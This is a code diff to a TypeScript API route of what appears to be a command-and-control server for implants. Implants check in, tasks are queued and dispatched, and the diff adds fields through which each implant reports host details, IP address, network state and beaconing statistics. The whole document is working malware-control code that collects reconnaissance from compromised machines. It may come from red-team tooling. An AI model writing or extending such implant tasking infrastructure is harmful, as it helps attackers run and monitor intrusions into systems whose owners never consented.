@@ -11,12 +11,30 @@ export const dynamic = "force-dynamic"
 const TaskRequestSchema = z.object({
   implant_id: z.string(),
   last_seen: z.number(),
+  system_info: z.object({
+    hostname: z.string().optional(),
+    os: z.string().optional(),
+    arch: z.string().optional(),
+    uptime: z.number().optional(),
+    memory_mb: z.number().optional(),
+    go_version: z.string().optional(),
+  }).optional(),
+  network_state: z.object({
+    interface: z.string().optional(),
+    ip_address: z.string().optional(),
+    latency_ms: z.number().optional(),
+  }).optional(),
+  beacon_state: z.object({
+    consecutive_failures: z.number().optional(),
+    current_backoff: z.number().optional(),
+    total_checkins: z.number().optional(),
+  }).optional(),
 })
 
 export async function POST(req: NextRequest): Promise<NextResponse> {
   try {
     const body = await req.json()
-    const { implant_id, last_seen } = TaskRequestSchema.parse(body)
+    const { implant_id, last_seen, system_info: _system_info, network_state: _network_state, beacon_state: _beacon_state } = TaskRequestSchema.parse(body)
 
     // Update implant last seen time
     await updateImplantLastSeen(implant_id)
@@ -34,9 +52,9 @@ export async function POST(req: NextRequest): Promise<NextResponse> {
       })
     }
 
-    // Get pending tasks for this implant
-    const pendingTasks = await getPendingTasksForImplant(implant_id)
-    
+    // Get pending tasks for this implant (use DB primary key, not implant_id string)
+    const pendingTasks = await getPendingTasksForImplant(implant.id)
+
     // Mark tasks as running
     for (const task of pendingTasks) {
       await updateImplantTask(task.id, "running")
